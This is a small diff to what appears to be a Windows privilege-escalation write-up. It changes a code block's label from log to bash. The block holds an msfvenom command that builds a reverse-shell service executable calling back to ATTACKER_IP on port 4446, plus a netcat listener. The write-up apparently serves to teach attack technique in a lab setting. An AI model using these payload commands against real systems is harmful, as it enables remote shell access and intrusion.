@@ -70,7 +70,7 @@ C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 
 - Generating and Transfering the **PAYLOAD**
 
-```log
+```bash
 attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc.exe
 attacker@machine:~$ nc -lvp 4446
 ```
